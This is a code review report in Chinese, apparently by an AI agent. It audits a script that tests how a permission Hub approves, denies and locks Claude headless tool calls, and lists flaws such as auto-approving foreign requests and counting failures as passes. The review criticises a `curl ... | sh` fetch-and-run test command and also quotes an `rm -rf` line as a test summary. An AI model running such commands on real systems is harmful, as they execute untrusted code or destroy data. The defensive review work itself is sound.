# Codex 对真实会话验证脚本的独立审查

审查日期：2026-11-18。审查对象：`pc/verify_real_session.py`、`pc/test_verify_real_session.py`；依据：`research/brief-verify-real-session.md`、`research/hub-nonce-results.md`，并核对实际 Hub、relay、风险分类器和测试目录现有钩子。

审查结论：**REQUEST CHANGES：5 项 P1、3 项 P2；未发现达到 P0 的问题。** 现有脚本既有不能完成运行的问题，也有能生成错误“通过”证据的问题。

本次未修改代码文件，未调用真实 `claude -p`、未执行场景中的 shell 命令，未连接 COM4、未上传固件、未启停用户 Hub。动态复现只使用临时目录、进程内替身和监听随机端口的隔离测试 Hub。文中“内存适配”仅为越过已知 409、检查后续逻辑的审查手段，不是磁盘代码修复，也不是原版测试通过。

## P0

无。以下安全问题仍应在真实运行前修复。

## P1

### P1-1：审批不适配 nonce 与切换保护，立即重试仍失败

**位置：** `pc/verify_real_session.py:492–504`；相关调用 `:543`、`:675`、`:800`；协议实现 `pc/hub.py:526–555`。

**问题：** `_act_on_request()` 的两次请求都只带 `request_id`，没有 `nonce`；第一次 409 后立即再次发送，也不检查具体错误。Hub 默认 `require_nonce=False`，因此当前 `switch_guard` 的直接原因是请求刚出现或刚切换显示后，批准到达时间不足 300ms，**不是少 nonce 本身**。`slot` 选择也可能重启保护期。开启 `require_nonce=True` 后，缺 nonce 会另外触发 `nonce_required`，单纯睡眠无法解决。

**复现：** 直接运行原版：

```powershell
& 'D:\conda\miniconda3\python.exe' -B pc/test_verify_real_session.py
```

本次实际输出为 `Ran 8 tests in 30.173s`、`FAILED (errors=9)`。4 个测试方法出错，其中判定负例方法的 6 个 subtest 均提前出错；另外 4 个方法通过。不能沿用“只有 3 个测试失败”的旧计数。这些错误都在场景 1 的 `:504` 再次抛出 `Hub HTTP 409: switch_guard`，后续场景尚未被检验。

用真实隔离 Hub、真实 HTTP、同一个 low 请求补充复现：

| Hub 设置 | 发送方式 | 实测结果 |
| --- | --- | --- |
| `require_nonce=False` | 立即、不带 nonce | `409 switch_guard` |
| `require_nonce=False` | 立即、带正确 nonce | `409 switch_guard` |
| `require_nonce=False` | 等待 330ms、带正确 nonce | `allowed` |
| `require_nonce=True` | 立即、不带 nonce | `409 nonce_required` |
| `require_nonce=True` | 立即、带正确 nonce | `409 switch_guard` |
| `require_nonce=True` | 等待 330ms、不带 nonce | `409 nonce_required` |
| `require_nonce=True` | 等待 330ms、带正确 nonce | `allowed` |

**正确改法：带 nonce，加针对 `switch_guard` 的有界等待重试，三者不能互相替代。**

1. 在确认是本场景的请求后，冻结该次决定的 `(request_id, nonce)`；`approve`、`deny` 和 high 第二次确认都显式携带这两个值。
2. 新出现或经 `slot` 切换的 **pending** 请求，批准前等保护期；若仍收到确切的 `409 switch_guard`，等待至少 300ms 加少量余量，再读 `/state` 确认还是同一请求、nonce、会话和预期操作，最后重试。真实渲染也可能刷新保护期，故一次固定睡眠不足以替代有界重试。用场景 deadline 限制等待。
3. `stale_nonce`、`nonce_required`、`displayed request changed`、其他 409 不要一律重发，更不能换成新队首的 nonce 自动批准。过期或目标变化时记录失败，交还场景控制流程。
4. deny 豁免 300ms；已经 `locked` 的 critical 请求也不走 pending 的切换保护，勿给它机械增加 300ms 等待。high 同一请求的第二次确认须在 1.5s 内完成；新 gate/PermissionRequest 阶段要使用该阶段自己的 id、nonce。
5. 测试补上正确 nonce 仍受保护、保护后成功、强制 nonce、错 nonce 不重绑、切换后重新等待等用例。不要关闭 Hub guard 或靠把整个测试跑慢来“修复”。

仅在审查进程内替换该动作方法，保留原文件不动，并使用冻结 nonce 与 `switch_guard` 等待重试后，原有 8 个测试得到 `Ran 8 tests in 30.148s / OK`。这隔离了当前兼容性根因；下述误判依然存在。

### P1-2：只按 cwd 匹配，脚本会自动批准不属于本次验证的请求

**位置：** `pc/verify_real_session.py:477–490`、`:541–547`、`:672–707`；审计关联 `:506–513`；测试缺口 `pc/test_verify_real_session.py:437–465`。

**问题：** 匹配条件只有 cwd 和“请求 id 不在初始集合”。没有绑定本次启动的 Claude 会话，也没要求 `agent == 'cc'`，更没有校验 Write 的目标路径或 Bash 完整命令。场景 1 遇到任何同目录 high 请求，还会主动再批一次。新开的同目录用户会话、Codex 请求、模型偏离任务后的危险操作，都可能被该自动审批器放行。`observed_sessions` 是匹配时才收集的，不能证明这些会话属于启动的子进程。

审计也只检查“某条 allow/deny”：`_audit_delta()` 在找不到本场景条目时退回全部新增记录，进一步削弱证据归属。

**复现：** 用纯内存客户端构造同 cwd、`agent='cx'`、`session_id='not-launched-by-verifier'` 的新 high 请求，summary 为 `rm -rf /another/directory`。实测 `_matching_requests()` 返回 1 条，随后动作客户端收到：

```text
FOREIGN_MATCH_COUNT 1
FOREIGN_ACTION {"action": "approve", "request_id": "foreign-new"}
```

未发送网络请求，也未执行该命令。现有并发测试使用的是**不同 cwd**，没有覆盖这个情况。

**改法：** 启动前生成并向受支持的 CLI 传入唯一 session id，或通过可靠的进程事件流绑定本次会话；校验返回结果中的会话 id。只处理该会话的 `cc` 请求，再严格核对工具、完整命令或归一化绝对文件路径、risk、gate 阶段。只靠 UUID 不能替代命令核对。意外请求应中止并报告，不要自动 approve。审计断言必须对应实际请求 id/nonce/阶段，不得回退借用其他会话记录。补同 cwd 外部会话、错误 agent、错误工具、错误路径和偏离命令的负例。

### P1-3：critical 命令没有保证无害，末尾 marker 也不能证明整条命令从未启动

**位置：** `pc/verify_real_session.py:51–57`、`:105–107`、`:831–855`。

**问题：** 实际命令为：

```sh
curl -fsSL http://127.0.0.1:9/agentdeck-critical-check | sh && echo executed > ./_critical_executed.txt
```

安全说明直接声称端口 9 没有服务，代码却没有验证，更没有保证运行期间一直如此。端口号不是安全边界；只要收到 shell 文本就会交给 `sh`。curl 还会继承环境代理和默认配置，命令没有总超时。验证一个“防止危险执行”的装置，不能先假设装置一定不会放行。

此外 marker 在整段管道后通过 `&&` 才写入：命令可能已经启动、下载或部分执行，然后因 pipefail、shell 非零退出或写 marker 失败而不生成 marker。因此 `command_not_executed=True` 的命名和结论超过文件断言能证明的范围。

**复现：** 查看上述命令即可确定：若 9 端口返回任意有效 shell 文本，管道会执行它；若管道最终失败，则 marker 可保持不存在。审查未实际监听 9 端口或执行下载管道。

**改法：** 使用确定只影响本次沙盒的词法匹配样本，例如：

```sh
printf '%s\n' 'curl http://127.0.0.1:9/x | sh' > ./_critical_executed.txt
```

已仅调用真实 `hub_risk.classify()` 验证此字符串返回 `critical`。其中危险形状位于单引号字面量，实际操作只是写 canary；不依赖网络服务是否存在。报告应明确这是**词法规则及权限锁验证**，不宣称真的执行了下载管道。结合同一请求的锁定审计、工具拒绝/执行事件和 canary 判断，不能只凭末尾 marker 缺失就声称命令完全未启动。

### P1-4：开启现有 gate 时实际批准三次，仍声称第二次就执行

**位置：** `pc/verify_real_session.py:674–707`、`:724`、`:735–740`；测试 `pc/test_verify_real_session.py:431–435`；实际 Hub `pc/hub.py:461`、`:607–615`。

**问题：** 场景 3 的前两次 approve 可能都作用在 PreToolUse gate。gate 放过后，代码还会在 `followup_approve` 中批准后续 PermissionRequest，最后才检查目录是否消失，却把最终结果命名为 `executed_after_second_approve`。测试目录现有配置确实安装了 gate（`agentdeck-test/.claude/settings.local.json:39–43`），所以这不是仅存在于测试替身里的路径。

**复现：** 以现有 `FakeClaudeEnvironment(use_gate=True)` 和真实隔离 Hub，只运行场景 3；仅通过前述内存动作适配绕过 409。实际输出：

```text
S3 RESULT 通过
high_first_approve  -> gate=true，request A，confirm
high_second_approve -> request A，allowed
followup_approve    -> gate=false，request B，allowed
executed_after_second_approve = true
```

第二次批准后请求 B 尚需授权；文件真正删除是在第三次后。现有 gate-enabled 测试仍把这条路径判为成功。

**改法：** 分开记录 gate 与 PermissionRequest 的动作、请求 id、nonce 和执行时间点。在本需求“总计两次批准”的口径下，禁止隐含第三次批准，并应在后续批准前证明第二次已执行。当前 Hub 的 gate 模式是“两次 gate 确认，再一次 PermissionRequest”，脚本不能单方面将它包装成两次。若继续沿用该配置，就如实报告“2 次 gate + 1 次权限批准”，把“两次即执行”标为未满足；也可另行设计 permission-only 的两次确认验证，但不能暗改用户钩子或 Hub 配置。补“第三次之前目录仍在”的测试。

### P1-5：CLI 失败或无效 JSON 可以被判为通过

**位置：** `pc/verify_real_session.py:386–409`、`:569–576`、`:628–634`、`:732–743`、`:844–858`；测试替身固定成功输出 `pc/test_verify_real_session.py:255–262`。

**问题：** 场景 2 和 4 不检查 `returncode`；所有真实 Claude 场景都只保存 JSON，不校验 `type`、`subtype`、`is_error` 或会话归属。场景 1 和 3 即便检查退出码 0，也接受无效 JSON、结构化执行错误。错误退出加“文件不存在”不能自动变成有效拒绝证据。

**复现：** 让假进程返回 `returncode=17`、stdout 为非 JSON、`timed_out=False`，提供对应 deny/locked 响应和审计，文件保持不存在；直接调用场景 2/4，实测：

```text
deny     status=通过 returncode=17 parsed_json=null
critical status=通过 returncode=17 parsed_json=null
```

`_parse_claude_json()` 对 `{"type":"result","subtype":"error_during_execution","is_error":true}` 也只是保存，不会让场景失败。这里使用纯内存客户端，没有运行 Claude。

**改法：** 统一校验完整的最终 result 对象、成功 subtype、`is_error=False`、正常退出且未超时、会话 id 对应本次子进程。预期的工具拒绝应由同一请求的 permission denial/工具结果和 Hub 审计证明；不能把任意 CLI/API/解析失败当作预期拒绝。批准场景同时核对实际工具、文件内容和执行证据。补非零退出、空 stdout、坏 JSON、错误 subtype、`is_error=True`、错误 session id 的负例。

## P2

### P2-1：场景抛异常时，五行报告和该场景证据都不落盘

**位置：** `pc/verify_real_session.py:1078–1097`，特别是 `:1088`；各场景进程结果与快照只在正常离开循环后收集，如 `:562–583`。

**问题：** `outcome = fn()` 没有场景级异常处理，证据和总报告又都在它返回后才写。409、HTTP 断开、子进程启动失败或文件错误，会留下空/半份结果目录并跳过剩余场景。内部 finally 虽会终止子进程，却没有保存失败现场。这个缺陷在修复 switch_guard 后仍可被其他异常触发。

**复现：** 原版测试的 switch_guard 栈直接穿透 `run():1088`，无法得到要求的五行 `results.md`。另可令场景 2 的 spawner 抛 `OSError`：场景 1 已写，场景 2 无证据，总报告不生成。

**改法：** 每场景从启动时开始保存前置快照、命令、响应及异常；在 finally 收集能取得的 stdout/stderr 和后置快照。顶层把异常变为明确的失败 outcome，无法安全继续的后续场景标“跳过”，总报告在最终收尾时写出五行，整体非零退出。不要用异常兜底把失败变成通过。

### P2-2：critical 锁定靠轮询短暂状态，测试特意等待观察者，掩盖真实竞态

**位置：** `pc/verify_real_session.py:775–793`、`:814–818`、`:836–852`；`pc/test_verify_real_session.py:245–252`；生命周期见 `pc/hub.py:410–416`、`:462–471`。

**问题：** critical PermissionRequest 在 Hub 中记录 locked 后立即返回 `{}`。后续同会话的 Stop 等事件会清理 locked，请求可能在 verifier 下一次轮询前消失。测试中的假 Claude 却专门等待“verifier 已发两次 locked approve”或 1.5s，形成观察者参与的生命周期；真实 Claude 没有这段等待。

**复现：** 在临时 Hub 中取消替身这段等待，并让 fake 子进程在 verifier 第一次后续轮询前完成，实测：

```text
status=失败
audit_recorded_locked=true
command_not_executed=true
consecutive_approves_returned_locked=false
```

此时 Hub 正确记录了锁定、未执行操作。脚本还通过 `_missing_hook_note()` 误提示“Hub 未收到请求”，与已有 locked 审计矛盾。

**改法：** 区分“有锁定审计，但未采到两次动作”和“钩子从未触发”；错过现场必须报告未验证，不能从审计补造两次 locked 响应。若一定需要稳定取得这两个 HTTP 回应，就设计明确可控、仅用于测试会话的权限等待机制，或说明该实时观察依赖的前置条件；单纯提高轮询频率不能消除竞态。离线测试删除观察者感知的等待，增加立即 Stop/SessionEnd 的独立时序用例。

### P2-3：固定沙盒会删除测试目录里预先存在的数据

**位置：** `pc/verify_real_session.py:644–652`、`:725–726`。

**问题：** 准备场景 3 时直接 `shutil.rmtree(_verify_high_sandbox)`，不判断是否由本次验证创建；结束时又整目录删除。影响范围在指定测试目录内，但不等于这些数据属于本次脚本。`ok.txt`、`deny.txt` 和 critical marker 也会被预先删除，应明确其归属。

**复现：** 仅在临时目录预建 `_verify_high_sandbox/unrelated.txt`；让假客户端在第一次 `state()` 处抛错，阻止启动子进程。实测旧文件已经消失，新的 canary 已创建：

```text
preexisting unrelated file retained: False
canary created: True
```

**改法：** 使用每次运行唯一的子目录及归属标记，路径和清理范围都限定在本次创建的目录。若必须使用固定文件名/目录，发现既有数据时应报冲突而非先删除。补既存文件和失败时清理范围测试。

## Claude headless 与场景可行性的核对

不能把“`claude -p --permission-mode default` 必然跳过 PermissionRequest、直接拒绝”当成当前事实。当前官方文档明确说明：非交互、没有提示宿主时仍可由 PermissionRequest hook 作决定；未被 hook/宿主批准的需授权调用才默认拒绝。`default`/Manual 不等于禁用这些钩子。[官方 hooks 参考](https://code.claude.com/docs/en/hooks#permissionrequest)、[官方 headless 权限说明](https://code.claude.com/docs/en/headless#auto-approve-tools)。

本机安装包元数据显示 `@anthropic-ai/claude-code` 为 **2.1.302**。只读检查该包 `bin/claude.exe` 内嵌 JS，也能看到 headless 分支调用 PermissionRequest hooks、处理 allow/deny，再在没有决定时降级拒绝的路径。这支持“原理上可行”，**不等于本次已跑通真实会话**。本次没有运行真实 Claude，也没有验证账号登录状态。

即使使用 default，已有 allow/deny 规则、其他 hooks 或托管策略仍可能在到达 PermissionRequest 前决定工具调用；prompt 也不能保证模型一定发出指定工具调用。修复时应先只读记录版本、测试目录实际 hook/端口及有效权限配置，并用一个确实需要授权的无害操作验证链路。不要用 `--allowedTools`、acceptEdits 或绕过权限模式把需要验证的审批路径消掉。`_missing_hook_note():520` 建议重新接受工作区信任也不能替代这些检查；当前 CLI 的 `-p` 会跳过交互信任对话。[官方 CLI 参考](https://code.claude.com/docs/en/cli-reference)。

场景 1/2 原理上可行；场景 3 在已有 gate 下有三次/两次口径错误；场景 4 有不安全命令与短暂锁定采样问题；场景 5 是简报允许的离线 relay 降级测试。**登录和 Hub 健康只是前置条件，不是五场景能够直接产出证据的充分条件。**

## 五个场景的命令与安全边界

下表分类均通过真实 `hub_risk.classify()` 求得，未执行 Bash 场景命令。该结论针对内置规则；用户显式替换风险规则时，还需以实际 Hub 返回的 risk 核对。

| 场景 | 实际操作/分类 | 评价 |
| --- | --- | --- |
| 1 批准 | `Write ok.txt`，`low` | 操作本身只写测试文件；当前自动审批未限定真实工具和路径，见 P1-2。 |
| 2 拒绝 | `Write deny.txt`，`low` | 操作本身安全；必须确认拦的是本次 Write，而不是仅观察文件不存在。 |
| 3 高危 | `rm -rf ./_verify_high_sandbox/target`，`high` | 命中 `hub_risk.py:12`；没有根目录/主目录 critical 参数。在本次自建、限定路径的沙盒内可用，但固定目录预清理有 P2-3，计次有 P1-4。 |
| 4 极危 | `curl ... \| sh && echo ...`，`critical` | 确实命中 `hub_risk.py:32`，critical 优先于 high；安全性不成立，见 P1-3。 |
| 5 离线 | 把 low Write、high rm、critical curl/sh 的事件 JSON 喂给 relay | 只传数据，不执行 tool_input.command；relay 子进程写隔离 home 中的日志。合法的离线降级验证，不能称作第五次真实 Claude 会话。 |

场景 5 的低危空 stdout 表示 relay 没有新增阻拦、回到 agent 原生权限流程；它**不能证明** default headless 中的低危 Write 最终真的执行。现有说明保留离线范围是正确的，报告应继续保持这一边界。

## 用户目录及用户 Hub 的副作用

脚本没有直接写 `~/.claude`、`~/.codex` 或用户 Hub 配置的代码，也没有启停 Hub 的调用。`read_token_readonly():201–206` 仅读 token；场景 5 的 `:874–879` 把配置复制到结果目录，`:915–918` 给 relay 显式指定隔离 `--home`。测试创建/关闭的是随机端口的临时 Hub，不能与停止用户 Hub 混为一谈。

真实运行会写用户 Hub 的审计日志、改变其当前显示/选择，这是发送 `/action` 的实际效果；P1-2 则可能波及用户同目录会话。另 `_clean_env():172–175` 仍继承真实 HOME，CLI 自身可能保存会话/运行状态，故“脚本不改用户配置”不能扩展成“真实 Claude 对 `~/.claude` 绝对零写入”。`--home` 目前只影响 Hub token/离线 relay，不是 Claude 的配置隔离开关。若要求严格零写用户目录，需要单独解决运行时隔离与认证复用，不能在报告里直接承诺。

## 测试是否只是在断言自己的字符串

**不是全都如此。** 风险分类测试调用真实分类器；主要场景测试启动真实隔离 `HubServer`，经真实 HTTP/relay 推进状态机，检查文件副作用和审计链；6 类负例也有价值。修正动作兼容性后，它们确实可以跑通。

但 fake subprocess 根据 prompt 字符串自行决定工具，主动制造 PermissionRequest、文件结果和成功 JSON；这不能证明真实 Claude 会如此调用。尤其是 P2-2 的“等观察者两次批准再 Stop”会隐藏竞态，P1-4 的三次批准仍通过，P1-5 的错误输出没有负例。`test_risk_rules_match_chosen_commands` 只证明词法命中，不证明命令无害。现有测试可以作为部分离线集成回归，不能替代真实会话证据。

## 本次验证记录与交付范围

所有 Python 均使用 `D:/conda/miniconda3/python.exe`；使用 `-B` 避免本进程生成 pyc。运行时只替换临时对象的诊断，均未写回代码。

| 检查 | 实际结果 |
| --- | --- |
| 原版 `python -B pc/test_verify_real_session.py` | `Ran 8 tests in 30.173s`，`FAILED (errors=9)`；4 个方法通过，4 个方法出错（含 6 个负例 subtest 错误）。 |
| 内存适配动作方法后，重跑同一离线测试类 | `Ran 8 tests in 30.148s`，`OK`；只用于隔离根因，原文件仍有问题。 |
| `python -B -m unittest discover -s pc -p "test_hub*.py"` | `Ran 403 tests in 13.712s`，`OK`。 |
| `python -B pc/test_ui.py` | `UI: 7 groups passed`。 |
| `python -B pc/test_daemon.py` | `daemon offline tests: 10 groups passed`。 |
| `python -B pc/test_pc.py` | `PC and firmware loop: 4 groups passed`。 |
| 两个审查对象的语法与文件完整性 | `ast.parse` 均通过；审查取证与报告写入后的 SHA-256 一致。 |
| 正确 nonce / 300ms / 强制 nonce 的隔离 HTTP 复现 | 结果见 P1-1 表。 |
| gate 下场景 3、错误 CLI 输出、同 cwd 外部会话、快速 Stop | 已分别复现 P1-4、P1-5、P1-2、P2-2。 |
| 真实登录后的 Claude 会话 / 硬件 / 用户 Hub | 未运行；不声称已验证。 |

未做代码简化或修复。本次交付仅为 `research/review-codex-on-carbon-verify.md`。建议先修 P1，再补上述负例与不受观察者控制的时序测试，最后用已登录真实 CLI 验证；自动 HTTP 批准的证据也不能冒充实体按键和 LCD 的硬件证据。

审查对象 SHA-256：

```text
pc/verify_real_session.py      a69d3c0c4aca2f68ed54fd915463aa591aa770c79a682e4ee3c243ccca528de4
pc/test_verify_real_session.py a493ad66ff496a7376dabd2783599f973e4e93baa4c0a162cbddef542c0eb88d
```

未改显示输出，未运行会生成图片的 `pc/sim.py`；没有代码改动，不适用修改后的 lint/typecheck 验收。

结论：用户登录后不能直接用当前脚本产出可采信的投资人证据。
